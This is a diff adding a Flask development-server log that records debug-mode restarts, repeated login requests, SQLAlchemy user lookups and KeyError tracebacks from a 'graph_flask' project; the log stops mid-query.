@@ -1,0 +1,834 @@
+ * Serving Flask app "apps" (lazy loading)
+ * Environment: development
+ * Debug mode: on
+ * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 579-023-872
+ * Serving Flask app "apps" (lazy loading)
+ * Environment: development
+ * Debug mode: on
+ * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 579-023-872
+120.224.66.44 - - [10/Dec/2021 19:17:56] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [10/Dec/2021 19:19:28] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [10/Dec/2021 19:19:32] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+ * Serving Flask app "apps" (lazy loading)
+ * Environment: development
+ * Debug mode: on
+ * Running on http://0.0.0.0:8080/ (Press CTRL+C to quit)
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 579-023-872
+120.224.66.44 - - [11/Dec/2021 09:45:58] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 09:45:58,621 INFO sqlalchemy.engine.base.Engine SHOW VARIABLES LIKE 'sql_mode'
+2021-12-11 09:45:58,621 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 09:45:58,628 INFO sqlalchemy.engine.base.Engine SHOW VARIABLES LIKE 'lower_case_table_names'
+2021-12-11 09:45:58,628 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 09:45:58,639 INFO sqlalchemy.engine.base.Engine SELECT DATABASE()
+2021-12-11 09:45:58,639 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 09:45:58,648 INFO sqlalchemy.engine.base.Engine show collation where `Charset` = 'utf8mb4' and `Collation` = 'utf8mb4_bin'
+2021-12-11 09:45:58,648 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 09:45:58,654 INFO sqlalchemy.engine.base.Engine SELECT CAST('test plain returns' AS CHAR(60)) AS anon_1
+2021-12-11 09:45:58,654 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 09:45:58,659 INFO sqlalchemy.engine.base.Engine SELECT CAST('test unicode returns' AS CHAR(60)) AS anon_1
+2021-12-11 09:45:58,660 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 09:45:58,665 INFO sqlalchemy.engine.base.Engine SELECT CAST('test collated returns' AS CHAR CHARACTER SET utf8mb4) COLLATE utf8mb4_bin AS anon_1
+2021-12-11 09:45:58,665 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 09:45:58,674 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 09:45:58,675 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 09:45:58,675 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 09:45:58,682 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 09:45:58] "[37mPOST /login HTTP/1.1[0m" 200 -
+ * Detected change in '/root/graph_flask/apps/api.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 579-023-872
+120.224.66.44 - - [11/Dec/2021 10:23:59] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:23:59] "[35m[1mPOST /login HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/root/graph_flask/apps/api.py", line 20, in login
+    username = data['userName']
+KeyError: 'userName'
+120.224.66.44 - - [11/Dec/2021 10:24:08] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:24:08] "[35m[1mPOST /login HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/root/graph_flask/apps/api.py", line 20, in login
+    username = data['userName']
+KeyError: 'userName'
+120.224.66.44 - - [11/Dec/2021 10:24:15] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:24:15] "[35m[1mPOST /login HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/root/graph_flask/apps/api.py", line 20, in login
+    username = data['userName']
+KeyError: 'userName'
+120.224.66.44 - - [11/Dec/2021 10:26:54] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:26:54] "[35m[1mPOST /login HTTP/1.1[0m" 500 -
+Traceback (most recent call last):
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2464, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2450, in wsgi_app
+    response = self.handle_exception(e)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1867, in handle_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 2447, in wsgi_app
+    response = self.full_dispatch_request()
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1952, in full_dispatch_request
+    rv = self.handle_user_exception(e)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask_cors/extension.py", line 165, in wrapped_function
+    return cors_after_request(app.make_response(f(*args, **kwargs)))
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1821, in handle_user_exception
+    reraise(exc_type, exc_value, tb)
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/_compat.py", line 39, in reraise
+    raise value
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1950, in full_dispatch_request
+    rv = self.dispatch_request()
+  File "/root/.virtualenvs/py3-env/lib/python3.6/site-packages/flask/app.py", line 1936, in dispatch_request
+    return self.view_functions[rule.endpoint](**req.view_args)
+  File "/root/graph_flask/apps/api.py", line 20, in login
+    username = data['userName']
+KeyError: 'userName'
+120.224.66.44 - - [11/Dec/2021 10:28:34] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:28:34,516 INFO sqlalchemy.engine.base.Engine SHOW VARIABLES LIKE 'sql_mode'
+2021-12-11 10:28:34,516 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:28:34,523 INFO sqlalchemy.engine.base.Engine SHOW VARIABLES LIKE 'lower_case_table_names'
+2021-12-11 10:28:34,523 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:28:34,534 INFO sqlalchemy.engine.base.Engine SELECT DATABASE()
+2021-12-11 10:28:34,534 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:28:34,544 INFO sqlalchemy.engine.base.Engine show collation where `Charset` = 'utf8mb4' and `Collation` = 'utf8mb4_bin'
+2021-12-11 10:28:34,544 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:28:34,550 INFO sqlalchemy.engine.base.Engine SELECT CAST('test plain returns' AS CHAR(60)) AS anon_1
+2021-12-11 10:28:34,550 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:28:34,555 INFO sqlalchemy.engine.base.Engine SELECT CAST('test unicode returns' AS CHAR(60)) AS anon_1
+2021-12-11 10:28:34,555 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:28:34,560 INFO sqlalchemy.engine.base.Engine SELECT CAST('test collated returns' AS CHAR CHARACTER SET utf8mb4) COLLATE utf8mb4_bin AS anon_1
+2021-12-11 10:28:34,561 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:28:34,570 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:28:34,571 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:28:34,571 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:28:34,577 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:28:34] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:28:46] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:28:46,408 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:28:46,408 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:28:46,408 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:28:46,414 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:28:46] "[37mPOST /login HTTP/1.1[0m" 200 -
+2021-12-11 10:28:47,296 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:28:47,297 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:28:47,297 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:28:47,303 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:28:47] "[37mPOST /login HTTP/1.1[0m" 200 -
+2021-12-11 10:28:47,811 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:28:47,811 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:28:47,811 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:28:47,818 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:28:47] "[37mPOST /login HTTP/1.1[0m" 200 -
+2021-12-11 10:28:49,657 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:28:49,658 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:28:49,658 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:28:49,664 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:28:49] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:31:02] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:31:02,510 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:31:02,511 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:31:02,511 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:31:02,517 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:31:02] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:33:40] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:33:40,590 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:33:40,591 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:33:40,591 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:33:40,597 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:33:40] "[37mPOST /login HTTP/1.1[0m" 200 -
+ * Detected change in '/root/graph_flask/apps/api.py', reloading
+ * Restarting with stat
+ * Debugger is active!
+ * Debugger PIN: 579-023-872
+120.224.66.44 - - [11/Dec/2021 10:34:43] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:34:43,515 INFO sqlalchemy.engine.base.Engine SHOW VARIABLES LIKE 'sql_mode'
+2021-12-11 10:34:43,515 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:34:43,522 INFO sqlalchemy.engine.base.Engine SHOW VARIABLES LIKE 'lower_case_table_names'
+2021-12-11 10:34:43,522 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:34:43,533 INFO sqlalchemy.engine.base.Engine SELECT DATABASE()
+2021-12-11 10:34:43,533 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:34:43,543 INFO sqlalchemy.engine.base.Engine show collation where `Charset` = 'utf8mb4' and `Collation` = 'utf8mb4_bin'
+2021-12-11 10:34:43,543 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:34:43,549 INFO sqlalchemy.engine.base.Engine SELECT CAST('test plain returns' AS CHAR(60)) AS anon_1
+2021-12-11 10:34:43,549 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:34:43,554 INFO sqlalchemy.engine.base.Engine SELECT CAST('test unicode returns' AS CHAR(60)) AS anon_1
+2021-12-11 10:34:43,554 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:34:43,559 INFO sqlalchemy.engine.base.Engine SELECT CAST('test collated returns' AS CHAR CHARACTER SET utf8mb4) COLLATE utf8mb4_bin AS anon_1
+2021-12-11 10:34:43,559 INFO sqlalchemy.engine.base.Engine {}
+2021-12-11 10:34:43,569 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:34:43,570 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:34:43,570 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:34:43,576 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:34:43] "[37mPOST /login HTTP/1.1[0m" 200 -
+2021-12-11 10:34:43,956 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:34:43,957 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:34:43,958 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:34:43,965 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:34:43] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:34:55] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:34:55,679 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:34:55,680 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:34:55,680 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:34:55,686 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:34:55] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:35:43] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:35:43,131 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:35:43,131 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:35:43,131 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:35:43,137 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:35:43] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:36:47] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:36:47,457 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:36:47,458 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:36:47,458 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:36:47,464 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:36:47] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:37:11] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:37:11,420 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:37:11,421 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:37:11,421 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:37:11,427 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:37:11] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:37:28] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:37:29,036 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:37:29,036 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:37:29,037 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:37:29,043 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:37:29] "[37mPOST /login HTTP/1.1[0m" 200 -
+2021-12-11 10:37:29,982 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:37:29,983 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:37:29,983 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:37:29,989 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:37:29] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:37:48] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:37:48,932 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:37:48,932 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:37:48,932 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:37:48,938 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:37:48] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:37:59] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:37:59,849 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:37:59,849 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:37:59,849 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:37:59,855 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:37:59] "[37mPOST /login HTTP/1.1[0m" 200 -
+2021-12-11 10:38:00,700 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:38:00,701 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:38:00,701 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:38:00,707 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:38:00] "[37mPOST /login HTTP/1.1[0m" 200 -
+2021-12-11 10:38:03,714 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:38:03,714 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:38:03,714 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:38:03,720 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:38:03] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:38:14] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:38:14,415 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:38:14,416 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:38:14,416 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:38:14,423 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:38:14] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:39:03] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:39:03,620 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:39:03,621 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:39:03,621 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:39:03,627 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:39:03] "[37mPOST /login HTTP/1.1[0m" 200 -
+2021-12-11 10:39:03,975 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:39:03,976 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:39:03,976 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:39:03,982 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:39:03] "[37mPOST /login HTTP/1.1[0m" 200 -
+2021-12-11 10:39:05,789 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:39:05,789 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
+WHERE user.user_name = %(user_name_1)s
+2021-12-11 10:39:05,790 INFO sqlalchemy.engine.base.Engine {'user_name_1': 'admin'}
+2021-12-11 10:39:05,796 INFO sqlalchemy.engine.base.Engine ROLLBACK
+120.224.66.44 - - [11/Dec/2021 10:39:05] "[37mPOST /login HTTP/1.1[0m" 200 -
+120.224.66.44 - - [11/Dec/2021 10:39:27] "[37mOPTIONS /login HTTP/1.1[0m" 200 -
+2021-12-11 10:39:27,129 INFO sqlalchemy.engine.base.Engine BEGIN (implicit)
+2021-12-11 10:39:27,130 INFO sqlalchemy.engine.base.Engine SELECT user.id AS user_id, user.user_name AS user_user_name, user.password AS user_password 
+FROM user 
